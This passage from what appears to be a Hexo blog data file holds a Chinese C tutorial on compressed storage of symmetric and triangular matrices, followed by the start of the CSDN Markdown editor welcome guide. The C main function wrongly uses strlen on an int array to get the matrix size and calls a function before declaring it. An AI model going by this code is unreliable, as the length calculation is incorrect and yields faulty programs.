array[],int col,int row)\n{\n    int col_index,row_index;\n\n    for(col_index=0; col_index<col; col_index++)\n    {\n        for(row_index=0; row_index<row; row_index++)\n        {\n            //转换的坐标为（x(x+1)/2+y）\n            if(col_index<=row_index)\n            {\n                printf(\"%d \",array[row_index*(row_index+1)/2+col_index]);\n            }\n            else\n            {\n                printf(\"%d \",array[col_index*(col_index+1)/2+row_index]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\n```\n\n1.对称矩阵\n\n2.上三角矩阵\n\n使用array[0]来存储常数项的值\n\n```c\nvoid PrintUpTriangle(int array[],int col,int row)\n{\n    for(int index1=0;index1<col;index1++)\n    {\n        for(int index2=0;index2<row;index2++)\n        {\n            if(index1<index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index1*(index1+1)/2+1+index2]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n```\n\n3.下三角矩阵\n\n```c\nvoid PrintDownTriangle(int array[],int col,int row)\n{\n    for(int index1=0;index1<col;index1++)\n    {\n        for(int index2=0;index2<row;index2++)\n        {\n            if(index1>index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index2*(index2+1)/2+1+index1]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\n```\n\n","source":"_posts/特殊矩阵和广义表.md","raw":"---\ntitle: 特殊矩阵及广义表\ndate: 2021-08-08 20:56:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg4.jpeg\n---\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    //存贮数据的数组\n    int Myarray[10]={10,5,7,3,12,20,17,4,23,14};\n\n    int arryLength=(strlen(Myarray)-2)/2;\n\n    printf(\"%d \",arryLength);\n    PrintSymmetricArray(Myarray,arryLength,arryLength);\n\n    return 0;\n}\n\nvoid PrintSymmetricArray(int array[],int col,int row)\n{\n    int col_index,row_index;\n\n    for(col_index=0; col_index<col; col_index++)\n    {\n        for(row_index=0; row_index<row; row_index++)\n        {\n            //转换的坐标为（x(x+1)/2+y）\n            if(col_index<=row_index)\n            {\n                printf(\"%d \",array[row_index*(row_index+1)/2+col_index]);\n            }\n            else\n            {\n                printf(\"%d \",array[col_index*(col_index+1)/2+row_index]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\n```\n\n1.对称矩阵\n\n2.上三角矩阵\n\n使用array[0]来存储常数项的值\n\n```c\nvoid PrintUpTriangle(int array[],int col,int row)\n{\n    for(int index1=0;index1<col;index1++)\n    {\n        for(int index2=0;index2<row;index2++)\n        {\n            if(index1<index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index1*(index1+1)/2+1+index2]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n```\n\n3.下三角矩阵\n\n```c\nvoid PrintDownTriangle(int array[],int col,int row)\n{\n    for(int index1=0;index1<col;index1++)\n    {\n        for(int index2=0;index2<row;index2++)\n        {\n            if(index1>index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index2*(index2+1)/2+1+index1]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\n```\n\n","slug":"特殊矩阵和广义表","published":1,"updated":"2021-08-07T16:05:24.000Z","_id":"clg29vyi9006sao9cevrihsjs","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-comment\">//存贮数据的数组</span><br>    <span class=\"hljs-type\">int</span> Myarray[<span class=\"hljs-number\">10</span>]=&#123;<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">7</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">12</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">17</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">23</span>,<span class=\"hljs-number\">14</span>&#125;;<br><br>    <span class=\"hljs-type\">int</span> arryLength=(<span class=\"hljs-built_in\">strlen</span>(Myarray)<span class=\"hljs-number\">-2</span>)/<span class=\"hljs-number\">2</span>;<br><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,arryLength);<br>    PrintSymmetricArray(Myarray,arryLength,arryLength);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintSymmetricArray</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> col_index,row_index;<br><br>    <span class=\"hljs-keyword\">for</span>(col_index=<span class=\"hljs-number\">0</span>; col_index&lt;col; col_index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(row_index=<span class=\"hljs-number\">0</span>; row_index&lt;row; row_index++)<br>        &#123;<br>            <span class=\"hljs-comment\">//转换的坐标为（x(x+1)/2+y）</span><br>            <span class=\"hljs-keyword\">if</span>(col_index&lt;=row_index)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[row_index*(row_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+col_index]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[col_index*(col_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+row_index]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<p>1.对称矩阵</p>\n<p>2.上三角矩阵</p>\n<p>使用array[0]来存储常数项的值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintUpTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>;index1&lt;col;index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>;index2&lt;row;index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&lt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index1*(index1+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index2]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>3.下三角矩阵</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintDownTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>;index1&lt;col;index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>;index2&lt;row;index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&gt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index2*(index2+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index1]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-comment\">//存贮数据的数组</span><br>    <span class=\"hljs-type\">int</span> Myarray[<span class=\"hljs-number\">10</span>]=&#123;<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">7</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">12</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">17</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">23</span>,<span class=\"hljs-number\">14</span>&#125;;<br><br>    <span class=\"hljs-type\">int</span> arryLength=(<span class=\"hljs-built_in\">strlen</span>(Myarray)<span class=\"hljs-number\">-2</span>)/<span class=\"hljs-number\">2</span>;<br><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,arryLength);<br>    PrintSymmetricArray(Myarray,arryLength,arryLength);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintSymmetricArray</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> col_index,row_index;<br><br>    <span class=\"hljs-keyword\">for</span>(col_index=<span class=\"hljs-number\">0</span>; col_index&lt;col; col_index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(row_index=<span class=\"hljs-number\">0</span>; row_index&lt;row; row_index++)<br>        &#123;<br>            <span class=\"hljs-comment\">//转换的坐标为（x(x+1)/2+y）</span><br>            <span class=\"hljs-keyword\">if</span>(col_index&lt;=row_index)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[row_index*(row_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+col_index]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[col_index*(col_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+row_index]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<p>1.对称矩阵</p>\n<p>2.上三角矩阵</p>\n<p>使用array[0]来存储常数项的值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintUpTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>;index1&lt;col;index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>;index2&lt;row;index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&lt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index1*(index1+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index2]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>3.下三角矩阵</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintDownTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>;index1&lt;col;index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>;index2&lt;row;index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&gt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index2*(index2+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index1]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n"},{"title":"Markdown的使用","date":"2020-10-26T10:38:45.000Z","mp3":null,"cover":"img/markdonw.jpg","_content":"@[TOC](这里写自定义目录标题)\n\n# 欢迎使用Markdown编辑器\n\n你好！ 这是你第一次使用 **Markdown编辑器** 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。\n\n## 新的改变\n\n对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：\n 1. **全新的界面设计** ，将会带来全新的写作体验；\n 2. 在创作中心设置你喜爱的代码高亮样式，Markdown **将代码片显示选择的高亮样式** 进行展示；\n 3. 增加了 **图片拖拽** 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；\n 4. 全新的 **KaTeX数学公式** 语法；\n 5. 增加了支持**甘特图的mermaid语法[^1]** 功能；\n 6. 增加了 **多屏幕编辑** Markdown文章功能；\n 7. 增加了 **焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置** 等功能，功能按钮位于编辑区域与预览区域中间；\n 8. 增加了 **检查列表** 功能。\n [^1]: [mermaid语法说明](https://mermaidjs.github.io/)\n\n## 功能快捷键\n\n撤销：<kbd>Ctrl/Command</kbd> + <kbd>Z</kbd>\n重做：<kbd>Ctrl/Command</kbd> + <kbd>Y</kbd>\n加粗：<kbd>Ctrl/Command</kbd> + <kbd>B</kbd>\n斜体：<kbd>Ctrl/Command</kbd> + <kbd>I</kbd>\n标题：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>H</kbd>\n无序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>U</kbd>\n有序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>O</kbd>\n检查列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>C</kbd>\n插入代码：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>K</kbd>\n插入链接：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>L</kbd>\n插入图片：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>G</kbd>\n查找：<kbd>Ctrl/Command</kbd> + <kbd>F</kbd>\n替换：<kbd>Ctrl/Command</kbd> + <kbd>G</kbd>\n\n## 合理的创建标题，有助于目录的生成\n\n直接输入1次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成1级标题。\n输入2次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成2级标题。\n以此类推，我们支持6级标题。有助于使用`TOC`语法后生成一个完美的目录。\n\n## 如何改变文本的样式\n\n*强调文本* _强调文本_\n\n**加粗文本** __加粗文本__\n\n==标记文本==\n\n~~删除文本~~\n\n> 引用文本\n\nH~2~O is是液体。\n\n2^10^ 运算结果是 1024.\n\n## 插入链接与图片\n\n链接: [link](https://www.csdn.net/).\n\n图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw)\n\n带尺寸的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw =30x30)\n\n居中的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center)\n\n居中并且带尺寸的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center =30x30)\n\n当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。\n\n## 如何插入一段漂亮的代码片\n\n去[博客设置](https://mp.csdn.net/console/configBlog)页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 `代码片`.\n```javascript\n// An highlighted block\nvar foo = 'bar';\n```\n\n## 生成一个适合你的列表\n\n- 项目\n  - 项目\n    - 项目\n\n1. 项目1\n2. 项目2\n3. 项目3\n\n- [ ] 计划任务\n- [x] 完成任务\n\n## 创建一个表格\n一个简单的表格是这么创建的：\n项目     | Value\n-------- | -----\n电脑  | $1600\n手机  | $12\n导管  | $1\n\n### 设定内容居中、居左、居右\n使用`:---------:`居中\n使用`:----------`居左\n使用`----------:`居右\n| 第一列       | 第二列         | 第三列        |\n|:-----------:| -------------:|:-------------|\n| 第一列文本居中 | 第二列文本居右  | 第三列文本居左 |\n\n### SmartyPants\nSmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：\n|    TYPE   |ASCII                          |HTML\n|----------------|-------------------------------|-----------------------------|\n|Single backticks|`'Isn't this fun?'`            |'Isn't this fun?'            |\n|Quotes          |`\"Isn't this fun?\"`            |\"Isn't this fun?\"            |\n|Dashes          |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash|\n\n## 创建一个自定义列表\nMarkdown\n:  Text-to-HTML conversion tool\n\nAuthors\n:  John\n:  Luke\n\n## 如何创建一个注脚\n\n一个具有注脚的文本。[^2]\n\n[^2]: 注脚的解释\n\n##  注释也是必不可少的\n\nMarkdown将文本转换为 HTML。\n\n*[HTML]:   超文本标记语言\n\n## KaTeX数学公式\n\n您可以使用渲染LaTeX数学表达式 [KaTeX](https://khan.github.io/KaTeX/):\n\nGamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\forall\nn\\in\\mathbb N$ 是通过欧拉积分\n\n$$\n\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt\\,.\n$$\n\n> 你可以找到更多关于的信息 **LaTeX** 数学表达式[here][1].\n\n## 新的甘特图功能，丰富你的文章\n\n```mermaid\ngantt\n        dateFormat  YYYY-MM-DD\n        title Adding GANTT diagram functionality to mermaid\n        section 现有任务\n        已完成               :done,    des1, 2014-01-06,2014-01-08\n        进行中               :active,  des2, 2014-01-09, 3d\n        计划一               :         des3, after des2, 5d\n        计划二               :         des4, after des3, 5d\n```\n- 关于 **甘特图** 语法，参考 [这儿][2],\n\n## UML 图表\n\n可以使用UML图表进行渲染。 [Mermaid](https://mermaidjs.github.io/). 例如下面产生的一个序列图：\n\n```mermaid\nsequenceDiagram\n张三 ->> 李四: 你好！李四, 最近怎么样?\n李四-->>王五: 你最近怎么样，王五？\n李四--x 张三: 我很好，谢谢!\n李四-x 王五: 我很好，谢谢!\nNote right of 王五: 李四想了很长时间, 文字太长了<br/>不适合放在一行.\n\n李四-->>张三: 打量着王五...\n张三->>王五: 很好... 王五, 你怎么样?\n```\n\n这将产生一个流程图。:\n\n```mermaid\ngraph LR\nA[长方形] -- 链接 --> B((圆))\nA --> C(圆角长方形)\nB --> D{菱形}\nC --> D\n```\n\n- 关于 **Mermaid** 语法，参考 [这儿][3],\n\n## FLowchart流程图\n\n我们依旧会支持flowchart的流程图：\n```mermaid\nflowchat\nst=>start: 开始\ne=>end: 结束\nop=>operation: 我的操作\ncond=>condition: 确认？\n\nst->op->cond\ncond(yes)->e\ncond(no)->op\n```\n\n- 关于 **Flowchart流程图** 语法，参考 [这儿][4].\n\n## 导出与导入\n\n###  导出\n如果你想尝试使用此编辑器, 你可以在此篇文章任意编辑。当你完成了一篇文章的写作, 在上方工具栏找到 **文章导出** ，生成一个.md文件或者.html文件进行本地保存。\n\n### 导入\n如果你想加载一篇你写过的.md文件，在上方工具栏可以选择导入功能进行对应扩展名的文件导入，\n继续你的创作。\n\n [1]: http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference\n [2]: https://mermaidjs.github.io/\n [3]: https://mermaidjs.github.io/\n [4]: http://adrai.github.io/flowchart.js/\n","source":"_posts/欢迎使用CSDN-markdown编辑器.md","raw":"---\ntitle: Markdown的使用\ndate: 2020-10-26 18:38:45\ncategories: \n    - 关于Markdown的使用\ntags: \n    - Markdown\nmp3: \ncover: img/markdonw.jpg\n---\n@[TOC](这里写自定义目录标题)\n\n# 欢迎使用Markdown编辑器\n\n你好！ 这是你第一次使用 **Markdown编辑器** 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。\n\n## 新的改变\n\n对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：\n 1. **全新的界面设计** ，将会带来全新的写作体验；\n 2. 在创作中心设置你喜爱的代码高亮样式，Markdown **将代码片显示选择的高亮样式** 进行展示；\n 3. 增加了 **图片拖拽** 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；\n 4. 